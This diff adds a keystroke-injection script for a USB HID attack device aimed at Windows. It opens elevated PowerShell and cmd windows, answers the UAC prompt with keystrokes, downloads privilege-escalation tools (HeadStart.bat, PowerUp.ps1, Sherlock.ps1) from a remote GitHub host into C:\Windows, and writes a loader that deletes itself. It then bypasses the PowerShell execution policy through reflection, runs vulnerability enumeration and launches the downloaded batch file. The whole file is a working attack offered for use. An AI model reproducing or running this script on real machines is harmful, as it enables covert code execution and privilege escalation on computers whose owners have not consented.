@@ -1,0 +1,83 @@
+DELAY 750
+GUI r
+DELAY 1000
+STRING powershell Start-Process notepad -Verb runAs
+ENTER
+DELAY 750
+ALT y
+ENTER
+DELAY 1000
+ENTER
+STRING (New-Object Net.Webclient).DownloadFile('https://raw.githubusercontent.com/cscottgvit/WinLocalPriv_HeadStart/master/HeadStart.bat','C:\Windows\HeadStart.bat');
+STRING (New-Object Net.Webclient).DownloadFile('https://raw.githubusercontent.com/cscottgvit/WinLocalPriv_HeadStart/master/PowerUp.ps1','C:\Windows\PowerUp.ps1');
+STRING (New-Object Net.Webclient).DownloadFile('https://raw.githubusercontent.com/cscottgvit/WinLocalPriv_HeadStart/master/Sherlock.ps1','C:\Windows\Sherlock.ps1');
+ENTER
+STRING Remove-Item $MyINvocation.InvocationName 
+ENTER
+CTRL s
+DELAY 1000
+STRING C:\Windows\config-52301.ps1
+ENTER
+DELAY 1000
+ALT F4 
+DELAY 750  
+GUI r 
+DELAY 500 
+STRING powershell Start-Process cmd -Verb runAs 
+ENTER
+DELAY 1000
+ALT y 
+ENTER
+ENTER
+DELAY 2000
+STRING powershell.exe
+DELAY 2000
+ENTER
+STRING function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield('_context','nonpublic,instance').getvalue( $executioncontext)).gettype().getfield('_authorizationManager','nonpublic,instance').setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager 'Microsoft.PowerShell'))}
+DELAY 250
+ENTER
+STRING Disable-ExecutionPolicy
+DELAY 250
+ENTER
+STRING C:\Windows\config-52301.ps1
+DELAY 2000
+ENTER
+STRING Import-Module C:\Windows\PowerUp.ps1 ,C:\Windows\Sherlock.ps1
+DELAY 250
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+STRING Find-AllVulns
+DELAY 1000
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+STRING Invoke-AllChecks
+DELAY 1000
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER
+ENTER   
+STRING Start-Process -FilePath 'C:\Windows\HeadStart.bat'
+ENTER
+ENTER
